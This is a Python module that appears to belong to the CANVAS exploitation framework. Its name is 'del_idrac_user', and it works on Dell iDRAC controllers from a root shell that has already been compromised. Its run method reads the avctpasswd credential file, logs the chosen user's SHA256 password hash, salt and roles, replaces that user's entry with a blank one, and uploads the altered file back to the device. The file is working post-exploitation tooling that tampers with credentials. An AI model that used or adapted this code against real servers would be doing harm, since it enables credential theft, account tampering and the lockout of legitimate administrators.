#! /usr/bin/env python

import os
import sys

if '.' not in sys.path:
    sys.path.append('.')

import time
import hashlib
import logging
import tempfile
import datetime

from exploitutils import *

from canvaserror import NodeCommandError
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

import canvasengine


NAME                            = 'del_idrac_user'
DESCRIPTION                     = 'Remove ad user from iDrac appweb with a unixshell'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "DELL"
DOCUMENTATION["Repeatability"]  = 'Infinite'
DOCUMENTATION["NOTES"]          = """

This module only support UnixShellNode with root privileges.

"""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Tools"
PROPERTY['SITE']                = "Serverside"
PROPERTY['ARCH']                = [ ["UNIX"] ]
PROPERTY['DELIVERY']            = 'HTTP'


class UserIdracWebapp(object):
    def __init__(self, user_items):
        self.roles   = {}        
        self.name    = user_items[0]
        self.user_id = user_items[2]
        self.home    = user_items[5]
        self.enabled = int(user_items[8]) == 1
        self.pwdhash = user_items[14]
        self.salt    = user_items[15]
        created_date = datetime.datetime.utcfromtimestamp(int(user_items[9]))
        self.created_date = created_date.strftime('%Y-%m-%d %H:%M:%S UTC')

        self._init_roles(int(user_items[7], 16))

    def _init_roles(self, roles_mask):
        self.roles['Login']                  = 'Enabled' if roles_mask & 1 else 'Disabled'
        self.roles['Configure']              = 'Enabled' if roles_mask & (1 << 1) else 'Disabled'
        self.roles['Configure Users']        = 'Enabled' if roles_mask & (1 << 2) else 'Disabled'
        self.roles['Logs']                   = 'Enabled' if roles_mask & (1 << 3) else 'Disabled'
        self.roles['System Control']         = 'Enabled' if roles_mask & (1 << 4) else 'Disabled'
        self.roles['Access Virtual Console'] = 'Enabled' if roles_mask & (1 << 5) else 'Disabled'
        self.roles['Access Virtual Media']   = 'Enabled' if roles_mask & (1 << 6) else 'Disabled'
        self.roles['System Operations']      = 'Enabled' if roles_mask & (1 << 7) else 'Disabled'
        self.roles['Debug']                  = 'Enabled' if roles_mask & (1 << 8) else 'Disabled'

    def __str__(self):
        mystr  = 'User name: %s\n' % self.name
        mystr += 'User ID: %s\n' % self.user_id
        mystr += 'User home: %s\n' % self.home
        mystr += 'User Enabled: %s\n' % str(self.enabled)
        mystr += 'User created date: %s\n' % self.created_date
        mystr += 'Password Hash (SHA256): %s\n' % self.pwdhash
        mystr += 'Password Salt: %s\n' % self.salt
        
        mystr += 'User Roles: \n\n' 

        for rolname in self.roles:
            mystr += "\t- %s: %s\n" % (rolname, self.roles[rolname])

        return mystr


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name     = NAME
        self.username = ''
        self.actvpasswd_path = '/flash/13g-cv/avctpasswd'

    # to display the name correctly in the info bar
    def __repr__(self):
        return self.name 

    def getargs(self):
        self.username = self.argsDict.get('username', self.username)

    def parse_actvpasswd(self, data):
        users = []
        entries = data.split('\n')
        for entry in entries:
            items = entry.split(':')
            if len(items) > 0 and items[0] != '@':
                users.append(UserIdracWebapp(items))

        return users

    def remove_user_from_idrac(self, node, actvpasswd_data, user):
        new_actvpasswd_data = ''

        for line in actvpasswd_data.split('\n'):
            if line.split(':')[2] == user.user_id:
                empty_entry = '@:@:%s:1:@:@:/bin/sh:0x0:0:946684815:0:0:0:@:@:0' % user.user_id
                new_actvpasswd_data += empty_entry + '\n'
            else:
                new_actvpasswd_data += line + '\n'

        tmp_local_path = '%s/%s' % (tempfile.gettempdir(), randomstring(8))
        with open(tmp_local_path, 'w') as f:
            f.write(new_actvpasswd_data)

        logging.info('Replacing avctpasswd file')

        try:
            node.upload(tmp_local_path, destfilename=self.actvpasswd_path)
        except NodeCommandError as e:
            return False

        return True


    def run(self):
        result = False
        self.setProgress(0)
        self.setInfo("%s (in progress)" % NAME)
        self.getargs()        
        
        for node in self.argsDict["passednodes"]:
            ntype = node.nodetype

            if ntype == "UnixShellNode":
                self.setProgress(33)
                logging.info('Reading avctpasswd file')
                actvpasswd_data, exitcode = node.shell.shellcommand("cat " + self.actvpasswd_path)
                
                if exitcode == 0:
                    logging.info('Analyzing avctpasswd file')
                    users = self.parse_actvpasswd(actvpasswd_data)

                    user_found = None
                    for user in users:
                        if user.name == self.username:
                            user_found = user                           
                            break

                    if user_found:
                        logging.info('User found in entry %s, removing...' % user_found.user_id)
                        self.setProgress(66)
                        logging.info('User to removed: \n%s' % str(user_found))
                        if self.remove_user_from_idrac(node, actvpasswd_data, user_found):
                            logging.info('User removed successfully')
                            result = True
                        else:
                            logging.error('An error occurred while removing the user %s, try again' % self.username)
                            result = False
                    else:
                        logging.error('User not found in iDrac appweb')
                        result = False
                else:
                    logging.error('File %s not found' % self.actvpasswd_path)
                    result = False
            else:
                logging.error("Node of type %s not supported yet" % ntype)

        if result:
            self.setInfo("%s - done (success)" % NAME)
            self.setProgress(100)
        else:
            self.setInfo("%s - done (failed)" % NAME)
            self.setProgress(-1)

        return result



